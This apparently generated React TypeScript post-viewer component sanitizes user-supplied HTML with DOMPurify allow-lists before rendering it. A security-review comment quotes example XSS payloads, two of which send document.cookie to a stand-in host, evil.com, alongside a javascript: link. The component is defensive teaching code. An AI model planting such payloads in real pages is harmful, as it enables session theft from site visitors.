# Generated by anthropic (claude-opus-4-6)
# Prompt: Write a React TypeScript component that displays user-generated HTML content. Users can format posts with rich HTML (bold, links, images). Use dangerouslySetInnerHTML to render the content prop. TypeScript interface should have content as string. This is for our blogging platform's post viewer component.

SELF-REVIEW REQUIRED:

After writing the code, review it for cross-site scripting (XSS) vulnerabilities and fix any issues found.

Steps:
1. Write the initial implementation.
2. Analyze the code for this vulnerability class.
3. Identify any unsafe HTML rendering, disabled escaping, unsanitized rich text, or bridge/webview paths that render untrusted content.
4. Replace unsafe rendering with auto-escaped output or carefully sanitized rich text rendering.
5. Provide the final secure version only.
# Category: xss

import React from "react";
import DOMPurify from "dompurify";

interface PostViewerProps {
  content: string;
}

// Initial implementation would have used dangerouslySetInnerHTML directly:
//
//   const PostViewer: React.FC<PostViewerProps> = ({ content }) => {
//     return (
//       <article className="post-viewer">
//         <div dangerouslySetInnerHTML={{ __html: content }} />
//       </article>
//     );
//   };
//
// SECURITY REVIEW:
// The above is vulnerable to XSS. User-generated HTML content passed directly
// to dangerouslySetInnerHTML allows attackers to inject malicious scripts, e.g.:
//   <img src=x onerror="document.location='https://evil.com/?c='+document.cookie">
//   <script>fetch('https://evil.com', {method:'POST', body:document.cookie})</script>
//   <a href="javascript:alert('XSS')">Click me</a>
//
// FIX: Sanitize the HTML using DOMPurify before rendering. We configure DOMPurify
// to allow only the tags and attributes needed for rich blog content (bold, italic,
// links, images, headings, lists, etc.) and strip everything else.

const ALLOWED_TAGS = [
  "h1", "h2", "h3", "h4", "h5", "h6",
  "p", "br", "hr",
  "b", "strong", "i", "em", "u", "s", "strike", "del",
  "blockquote", "pre", "code",
  "ul", "ol", "li",
  "a",
  "img",
  "figure", "figcaption",
  "table", "thead", "tbody", "tfoot", "tr", "th", "td",
  "span", "div", "section", "article",
  "sub", "sup",
  "mark",
];

const ALLOWED_ATTR = [
  "href", "target", "rel",
  "src", "alt", "title", "width", "height",
  "class",
  "colspan", "rowspan",
];

const ALLOWED_URI_REGEXP = /^(?:https?|mailto):/i;

function sanitizeContent(html: string): string {
  return DOMPurify.sanitize(html, {
    ALLOWED_TAGS,
    ALLOWED_ATTR,
    ALLOWED_URI_REGEXP,
    ALLOW_DATA_ATTR: false,
    ADD_ATTR: ["target"],
    // Force all links to open in new tab with safe rel attributes
    FORCE_BODY: true,
  });
}

// Hook to add rel="noopener noreferrer" and target="_blank" to all anchor tags
DOMPurify.addHook("afterSanitizeAttributes", (node) => {
  if (node.tagName === "A") {
    node.setAttribute("target", "_blank");
    node.setAttribute("rel", "noopener noreferrer");
  }
  // Remove any javascript: URIs that might slip through on any attribute
  if (node.hasAttribute("href")) {
    const href = node.getAttribute("href") || "";
    if (!ALLOWED_URI_REGEXP.test(href) && href.trim() !== "" && !href.startsWith("#")) {
      node.removeAttribute("href");
    }
  }
  if (node.hasAttribute("src")) {
    const src = node.getAttribute("src") || "";
    if (!ALLOWED_URI_REGEXP.test(src) && src.trim() !== "") {
      node.removeAttribute("src");
    }
  }
});

const PostViewer: React.FC<PostViewerProps> = ({ content }) => {
  const sanitizedContent = React.useMemo(() => {
    return sanitizeContent(content);
  }, [content]);

  return (
    <article className="post-viewer">
      <div
        dangerouslySetInnerHTML={{ __html: sanitizedContent }}
      />
    </article>
  );
};

export default PostViewer;
